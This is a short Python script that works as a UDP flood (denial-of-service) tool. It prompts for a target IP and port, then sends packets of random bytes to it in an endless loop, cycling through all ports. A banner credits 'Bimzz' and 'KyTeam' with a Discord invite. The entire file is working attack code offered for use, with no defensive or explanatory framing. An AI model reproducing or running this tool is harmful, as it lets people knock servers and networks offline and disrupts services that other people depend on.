import sys
import os
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
print("""\u001b[31m
>>> YouTube : Bimzz <<<
>>> Discord : KyBimzZ  び#1716 <<<
>>> KyTeam : https://discord.gg/YMT9utYW5U <<<""")

ip = str(input("IP TARGET : "))
port = int(input("PORT TARGET :"))

os.system("clear")
print("[Bimzz] | Wait 3s")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print(" [Bimzz] | ATTACKING SERVER !! ")
     if port == 65534:
       port = 1
